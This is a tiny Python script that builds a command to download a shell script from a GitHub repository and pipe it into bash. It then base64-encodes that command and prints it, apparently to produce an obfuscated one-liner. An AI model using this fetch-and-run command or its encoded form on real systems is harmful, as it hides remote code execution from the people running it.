import base64

cmd = """python3 -c "import os; os.system('curl -fsSl https://raw.githubusercontent.com/piadi-su/testing_repo/refs/heads/master/script/deploy.sh | bash')" """


encoded = base64.b64encode(cmd.encode()).decode()

print(encoded)
